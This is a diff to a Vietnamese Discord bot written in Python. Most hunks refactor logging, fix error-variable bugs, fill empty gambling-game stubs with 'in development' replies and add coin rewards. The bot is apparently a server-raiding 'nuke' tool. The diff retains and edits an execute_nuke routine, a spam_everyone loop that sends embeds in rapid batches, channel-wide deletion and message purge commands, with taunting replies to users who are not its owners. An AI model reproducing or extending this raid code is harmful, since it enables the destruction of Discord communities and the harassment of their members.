@@ -7,14 +7,20 @@ from discord.ext import commands
 import aiohttp
 from datetime import timedelta, datetime
 import json
-from keep_alive import keep_alive
+
+# ==================== KEEP_ALIVE (xử lý nếu không có file) ====================
+try:
+    from keep_alive import keep_alive
+except ImportError:
+    def keep_alive():
+        pass
 
 # ==================== CẤU HÌNH HỆ THỐNG ====================
 DISCORD_TOKEN = os.getenv("TOKEN")
 
 # Danh sách ID của Boss Bảo và các đồng minh ủy quyền
 BOT_OWNERS = [
-    1540585511842881616,1542453882263707759,1502969774202814625,
+    1540585511842881616, 1542453882263707759, 1502969774202814625,
 ]
 
 intents = discord.Intents.default()
@@ -236,6 +242,17 @@ def is_bot_owner():
         return ctx.author.id in BOT_OWNERS
     return commands.check(predicate)
 
+# ==================== HÀM GỬI LOG ĐẾN CÁC KÊNH LOG ====================
+async def send_log_to_all(guild_id, embed):
+    for g_id, ch_id in SERVER_LOG_CHANNELS.items():
+        if int(g_id) == guild_id:
+            channel = bot.get_channel(ch_id)
+            if channel:
+                try:
+                    await channel.send(embed=embed)
+                except:
+                    pass
+
 # ==================== VIEW XÁC NHẬN NUKE ====================
 class NukeConfirmView(discord.ui.View):
     def __init__(self, guild: discord.Guild, channel: discord.abc.Messageable):
@@ -272,13 +289,7 @@ async def execute_nuke(guild):
             description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
             color=0xFF0000
         )
-        for g_id, ch_id in SERVER_LOG_CHANNELS.items():
-            log_ch = bot.get_channel(ch_id)
-            if log_ch:
-                try:
-                    await log_ch.send(embed=nuke_log_embed)
-                except:
-                    pass
+        await send_log_to_all(guild.id, nuke_log_embed)
 
         supreme_role = None
         async def prep_nuke():
@@ -365,13 +376,7 @@ async def execute_nuke(guild):
             await asyncio.sleep(1.0)
 
         complete_log_embed = discord.Embed(title=f"✅ Hoàn tất nuke server {guild.name} bởi Boss Bảo!", color=0x00FF00)
-        for g_id, ch_id in SERVER_LOG_CHANNELS.items():
-            log_ch = bot.get_channel(ch_id)
-            if log_ch:
-                try:
-                    await log_ch.send(embed=complete_log_embed)
-                except:
-                    pass
+        await send_log_to_all(guild.id, complete_log_embed)
 
     except Exception as e:
         print(f"Lỗi khi thực hiện nuke: {e}")
@@ -862,9 +867,9 @@ async def spam_everyone(ctx):
             try:
                 tasks = []
                 for _ in range(10):
-                    embed = discord.Embed()
-                    embed.set_image(url=NUKE_GIF_URL)
-                    tasks.append(channel.send(spam_content, embed=embed))
+                    embed_spam = discord.Embed()
+                    embed_spam.set_image(url=NUKE_GIF_URL)
+                    tasks.append(channel.send(spam_content, embed=embed_spam))
                 await asyncio.gather(*tasks, return_exceptions=True)
                 await asyncio.sleep(0.5)
             except:
@@ -927,13 +932,7 @@ async def delete_all_channels(ctx):
             description="🎉 **Đã xóa thành công tất cả kênh!**",
             color=0x00FF00
         )
-        if ctx.guild.id in SERVER_LOG_CHANNELS:
-            log_ch = bot.get_channel(SERVER_LOG_CHANNELS[ctx.guild.id])
-            if log_ch:
-                try:
-                    await log_ch.send(embed=complete_embed)
-                except:
-                    pass
+        await send_log_to_all(ctx.guild.id, complete_embed)
         try:
             await ctx.author.send(embed=complete_embed)
         except:
@@ -1111,7 +1110,7 @@ async def set_server_name_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
+        await ctx.send(f"❌ Lỗi: {str(error)}")
 
 @bot.command(name="setservericon")
 @is_bot_owner()
@@ -1142,7 +1141,7 @@ async def set_server_icon_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
+        await ctx.send(f"❌ Lỗi: {str(error)}")
 
 # ==================== LỆNH KICK, BAN, UNBAN, CREATE CHANNEL, DELETE CHANNEL, PURGE, ROLE, REMOVEROLE, LOCK, UNLOCK ====================
 @bot.command(name="kick")
@@ -2265,18 +2264,6 @@ async def avatar(ctx, member: discord.Member = None):
 async def avatar_error(ctx, error):
     await ctx.send(f"❌ Lỗi: {str(error)}")
 
-# ==================== LỆNH SHUTDOWN (ĐÃ ĐƯỢC THAY THẾ BẰNG OFF) ====================
-# @bot.command(name="shutdown")
-# @is_bot_owner()
-# async def shutdown_bot(ctx):
-#     await ctx.send("🛑 **Boss Bảo đã yêu cầu tắt bot. Tạm biệt!**")
-#     await bot.close()
-
-# @shutdown_bot.error
-# async def shutdown_bot_error(ctx, error):
-#     if isinstance(error, commands.CheckFailure):
-#         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
-
 # ==================== LỆNH ADDOWNER & DELETEOWNER ====================
 @bot.command(name="addowner")
 @is_bot_owner()
@@ -2595,7 +2582,6 @@ async def autoclear_user(ctx, member: discord.Member):
     """Xóa toàn bộ tin nhắn của một thành viên trong kênh hiện tại."""
     try:
         deleted = 0
-        # Duyệt tất cả tin nhắn trong kênh
         async for message in ctx.channel.history(limit=None):
             if message.author == member:
                 await message.delete()
@@ -2620,17 +2606,15 @@ async def autoclear_user_error(ctx, error):
 @bot.command(name="autoclear")
 @is_bot_owner()
 async def autoclear_channel(ctx, limit: int = None):
-    """Xóa toàn bộ tin nhắn trong kênh hiện tại, có thể chỉ định số lượng tối đa."""
     try:
         if limit is None:
-            # Xóa tất cả tin nhắn (lặp đến khi không còn)
             deleted = 0
             while True:
                 msgs = await ctx.channel.purge(limit=1000)
                 deleted += len(msgs)
                 if len(msgs) < 1000:
                     break
-                await asyncio.sleep(1)  # Tránh rate limit
+                await asyncio.sleep(1)
         else:
             if limit < 1 or limit > 10000:
                 await ctx.send("⚠️ Số lượng từ 1 đến 10000.")
@@ -2659,6 +2643,7 @@ async def autoclear_channel_error(ctx, error):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
         await ctx.send(f"❌ Lỗi: {str(error)}")
+
 # ==================== HỆ THỐNG COIN & VUI CHƠI MỞ RỘNG ====================
 COIN_FILE = "coins.json"
 
@@ -2753,10 +2738,10 @@ async def work(ctx):
     user_id = ctx.author.id
     last = get_last(user_id, "last_work")
     now = datetime.now().timestamp()
-    if now - last < 3600:
-        remaining = int(3600 - (now - last))
-        minutes, seconds = divmod(remaining, 60)
-        await ctx.send(f"⏳ Bạn quá mệt rồi! Nghỉ **{minutes} phút {seconds} giây** nữa nhé.")
+    # Giới hạn 5 giây để tránh spam
+    if now - last < 5:
+        remaining = int(5 - (now - last))
+        await ctx.send(f"⏳ Bạn đã làm việc quá nhanh! Hãy đợi **{remaining} giây** nữa.")
         return
     earned = random.randint(50, 300)
     add_coins(user_id, earned)
@@ -2927,10 +2912,10 @@ async def rps(ctx, amount: int, choice: str):
         await ctx.send(f"❌ Không đủ coin! Hiện có: {get_balance(ctx.author.id)} coin.")
         return
     bot_choice = random.choice(["r", "p", "s"])
-    # Xác định thắng thua
     if choice == bot_choice:
         add_coins(ctx.author.id, amount)
         result_text = "Hòa"
+        winnings = 0
     elif (choice == "r" and bot_choice == "s") or \
          (choice == "s" and bot_choice == "p") or \
          (choice == "p" and bot_choice == "r"):
@@ -3005,11 +2990,12 @@ async def lottery(ctx, amount: int):
     if not subtract_coins(ctx.author.id, amount):
         await ctx.send(f"❌ Không đủ coin! Hiện có: {get_balance(ctx.author.id)} coin.")
         return
-    if random.random() < 0.01:  # 1% trúng lớn
+    if random.random() < 0.01:
         winnings = amount * 100
         add_coins(ctx.author.id, winnings)
         message = f"🎰 JACKPOT! Bạn trúng {winnings} coin."
     else:
+        winnings = 0
         message = f"🍀 Không trúng. Bạn mất {amount} coin."
     embed = discord.Embed(
         title="🎟️ XỔ SỐ",
@@ -3026,26 +3012,26 @@ async def blackjack(ctx, amount: int):
     if not subtract_coins(ctx.author.id, amount):
         await ctx.send(f"❌ Không đủ coin! Hiện có: {get_balance(ctx.author.id)} coin.")
         return
-    # Rút 2 lá cho người chơi, 1 lá cho bot
     player_cards = [random.randint(1, 11) for _ in range(2)]
     bot_cards = [random.randint(1, 11), random.randint(1, 11)]
     player_total = sum(player_cards)
     bot_total = sum(bot_cards)
-    # Logic đơn giản: người chơi dừng ở 17, bot rút thêm nếu <17
     while bot_total < 17:
         bot_cards.append(random.randint(1, 11))
         bot_total = sum(bot_cards)
-    # Xác định thắng
     if player_total > 21:
         result_text = "Bạn quá 21! Bot thắng."
+        winnings = 0
     elif bot_total > 21 or player_total > bot_total:
         winnings = amount * 2
         add_coins(ctx.author.id, winnings)
         result_text = f"Bạn thắng {winnings} coin!"
     elif player_total == bot_total:
         add_coins(ctx.author.id, amount)
+        winnings = 0
         result_text = "Hòa!"
     else:
+        winnings = 0
         result_text = f"Bot thắng! Bạn mất {amount} coin."
     embed = discord.Embed(
         title="🃏 BLACKJACK",
@@ -3059,7 +3045,7 @@ async def beg(ctx):
     user_id = ctx.author.id
     last = get_last(user_id, "last_beg")
     now = datetime.now().timestamp()
-    if now - last < 300:  # 5 phút cooldown
+    if now - last < 300:
         remaining = int(300 - (now - last))
         await ctx.send(f"⏳ Hãy kiên nhẫn, thử lại sau {remaining // 60} phút.")
         return
@@ -3078,7 +3064,7 @@ async def crime(ctx):
     user_id = ctx.author.id
     last = get_last(user_id, "last_crime")
     now = datetime.now().timestamp()
-    if now - last < 600:  # 10 phút cooldown
+    if now - last < 600:
         remaining = int(600 - (now - last))
         await ctx.send(f"⏳ Cảnh sát đang truy lùng, thử lại sau {remaining // 60} phút.")
         return
@@ -3173,160 +3159,159 @@ async def resetdaily_cmd(ctx, member: discord.Member):
     else:
         await ctx.send("❌ Người dùng chưa có dữ liệu.")
 
-# ==================== THÊM NHIỀU TRÒ KHÁC ====================
+# ==================== LỆNH CHƯA HOÀN THIỆN (THÔNG BÁO) ====================
 @bot.command(name="roulette")
 async def roulette(ctx, amount: int, choice: str):
-    # Roulette đơn giản: chọn màu hoặc số
-    pass
+    await ctx.send("Chức năng Roulette đang phát triển, vui lòng quay lại sau!")
 
 @bot.command(name="mines")
 async def mines(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Mines đang phát triển!")
 
 @bot.command(name="plinko")
 async def plinko(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Plinko đang phát triển!")
 
 @bot.command(name="wheel")
 async def wheel(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Wheel đang phát triển!")
 
 @bot.command(name="betroll")
 async def betroll(ctx, amount: int, threshold: int):
-    pass
+    await ctx.send("Chức năng Betroll đang phát triển!")
 
 @bot.command(name="battle")
 async def battle(ctx, member: discord.Member, amount: int):
-    pass
+    await ctx.send("Chức năng Battle đang phát triển!")
 
 @bot.command(name="steal")
 async def steal(ctx, member: discord.Member):
-    pass
+    await ctx.send("Chức năng Steal đang phát triển!")
 
 @bot.command(name="heist")
 async def heist(ctx):
-    pass
+    await ctx.send("Chức năng Heist đang phát triển!")
 
 @bot.command(name="interest")
 async def interest(ctx):
-    pass
+    await ctx.send("Chức năng Interest đang phát triển!")
 
 @bot.command(name="giveaway")
 @is_bot_owner()
 async def giveaway(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Giveaway đang phát triển!")
 
 @bot.command(name="rob")
 async def rob(ctx, member: discord.Member):
-    pass
+    await ctx.send("Chức năng Rob đang phát triển!")
 
 @bot.command(name="scout")
 async def scout(ctx):
-    pass
+    await ctx.send("Chức năng Scout đang phát triển!")
 
 @bot.command(name="bankrob")
 async def bankrob(ctx):
-    pass
+    await ctx.send("Chức năng Bankrob đang phát triển!")
 
 @bot.command(name="dig")
 async def dig(ctx):
-    pass
+    await ctx.send("Chức năng Dig đang phát triển!")
 
 @bot.command(name="mine")
 async def mine(ctx):
-    pass
+    await ctx.send("Chức năng Mine đang phát triển!")
 
 @bot.command(name="fish")
 async def fish(ctx):
-    pass
+    await ctx.send("Chức năng Fish đang phát triển!")
 
 @bot.command(name="hunt")
 async def hunt(ctx):
-    pass
+    await ctx.send("Chức năng Hunt đang phát triển!")
 
 @bot.command(name="chop")
 async def chop(ctx):
-    pass
+    await ctx.send("Chức năng Chop đang phát triển!")
 
 @bot.command(name="farm")
 async def farm(ctx):
-    pass
+    await ctx.send("Chức năng Farm đang phát triển!")
 
 @bot.command(name="gamble")
 async def gamble(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Gamble đang phát triển!")
 
 @bot.command(name="double")
 async def double(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Double đang phát triển!")
 
 @bot.command(name="triple")
 async def triple(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Triple đang phát triển!")
 
 @bot.command(name="jackpot")
 async def jackpot(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Jackpot đang phát triển!")
 
 @bot.command(name="spin")
 async def spin(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Spin đang phát triển!")
 
 @bot.command(name="roll")
 async def roll(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Roll đang phát triển!")
 
 @bot.command(name="draw")
 async def draw(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Draw đang phát triển!")
 
 @bot.command(name="guess")
 async def guess(ctx, amount: int, number: int):
-    pass
+    await ctx.send("Chức năng Guess đang phát triển!")
 
 @bot.command(name="bingo")
 async def bingo(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Bingo đang phát triển!")
 
 @bot.command(name="keno")
 async def keno(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Keno đang phát triển!")
 
 @bot.command(name="poker")
 async def poker(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Poker đang phát triển!")
 
 @bot.command(name="baccarat")
 async def baccarat(ctx, amount: int, choice: str):
-    pass
+    await ctx.send("Chức năng Baccarat đang phát triển!")
 
 @bot.command(name="craps")
 async def craps(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Craps đang phát triển!")
 
 @bot.command(name="war")
 async def war(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng War đang phát triển!")
 
 @bot.command(name="higher")
 async def higher(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Higher đang phát triển!")
 
 @bot.command(name="lower")
 async def lower(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Lower đang phát triển!")
 
 @bot.command(name="odds")
 async def odds(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Odds đang phát triển!")
 
 @bot.command(name="even")
 async def even(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Even đang phát triển!")
 
 @bot.command(name="odd")
 async def odd(ctx, amount: int):
-    pass
+    await ctx.send("Chức năng Odd đang phát triển!")
 
 # ==================== LỆNH TÌNH YÊU ====================
 # Danh sách GIF cho các hành động (mỗi danh sách 50 ảnh tenor hoạt động)
@@ -3809,7 +3794,7 @@ async def divorce(ctx, member: discord.Member = None):
     else:
         await ctx.send("❌ Hai bạn không phải là vợ chồng!")
 
-# Lệnh ship: ghép đôi (tương tự love nhưng có thể dùng cho người khác)
+# Lệnh ship: ghép đôi
 @bot.command(name="ship", aliases=["ghepdoi"])
 async def ship(ctx, user1: discord.Member = None, user2: discord.Member = None):
     if user1 is None:
@@ -3961,8 +3946,8 @@ HELP_CATEGORIES = {
     "🚦 Bật/Tắt lệnh": [
         "`nuked off <lệnh>` - Tắt một lệnh",
         "`nuked on <lệnh>` - Bật lại lệnh đã tắt",
-    ],  
-            "💰 Coin & Giải trí": [
+    ],
+    "💰 Coin & Giải trí": [
         "`nuked balance` - Xem số coin",
         "`nuked daily` - Nhận coin mỗi ngày",
         "`nuked work` - Làm việc kiếm coin",
@@ -4090,11 +4075,17 @@ async def on_message(message):
                 new_lv = user_data["level"]
                 if isinstance(message.author, discord.Member):
                     await check_and_assign_level_roles(message.author, new_lv)
+
+                # ===== THƯỞNG COIN KHI LÊN LEVEL =====
+                coin_reward = random.randint(50, 200)
+                add_coins(message.author.id, coin_reward)
+
                 level_embed = discord.Embed(
                     title="🎉 **CHÚC MỪNG LÊN LEVEL!** 🎉",
                     description=f"🌟 {message.author.mention} đã xuất sắc thăng cấp lên **Level {new_lv}**! 🚀",
                     color=0xFFD700
                 )
+                level_embed.add_field(name="💰 Thưởng coin", value=f"+{coin_reward} coin", inline=False)
                 level_embed.set_image(url="https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif")
                 level_embed.set_footer(text="Hệ thống thăng cấp tự động độc quyền")
                 target_channel = message.channel
@@ -4145,9 +4136,15 @@ async def on_message(message):
 # ==================== SỰ KIỆN JOIN/LEAVE ====================
 @bot.event
 async def on_member_join(member):
-    if member.guild is None: return
+    if member.guild is None:
+        return
     embed_log = discord.Embed(title="👋 THÀNH VIÊN MỚI GIA NHẬP", description=f"{member.mention} đã tham gia server.", color=0x00FF00)
     await send_log_to_all(member.guild.id, embed_log)
+
+    # ===== THƯỞNG COIN KHI JOIN SERVER =====
+    coin_reward = random.randint(10, 50)
+    add_coins(member.id, coin_reward)
+
     guild_id = member.guild.id
     if guild_id in WELCOME_CHANNELS:
         ch_id = WELCOME_CHANNELS[guild_id]
@@ -4157,6 +4154,7 @@ async def on_member_join(member):
                 title="🌈 **CHÀO MỪNG CHÚ BÁO NHỎ ĐẾN VỚI SERVER!** 🌈",
                 description=(
                     f"✨ Chào mừng chú báo nhỏ {member.mention} đã gia nhập máy chủ **{member.guild.name}**!\n\n"
+                    f"💰 **Thưởng join:** +{coin_reward} coin (tổng: {get_balance(member.id)} coin)\n\n"
                     "📌 **Giới thiệu các kênh:** Hãy khám phá đầy đủ các khu vực trò chuyện và giải trí.\n"
                     "📜 **Luật chung:** Luôn tuân thủ nội quy để server ngày càng văn minh nhé!\n\n"
                     "💖 Chúc bạn có những phút giây vui vẻ!"
@@ -4169,7 +4167,8 @@ async def on_member_join(member):
 
 @bot.event
 async def on_member_remove(member):
-    if member.guild is None: return
+    if member.guild is None:
+        return
     embed_log = discord.Embed(title="👋 THÀNH VIÊN RỜI KHỎI SERVER", description=f"{member.mention} đã rời server.", color=0xFF9900)
     await send_log_to_all(member.guild.id, embed_log)
     guild_id = member.guild.id
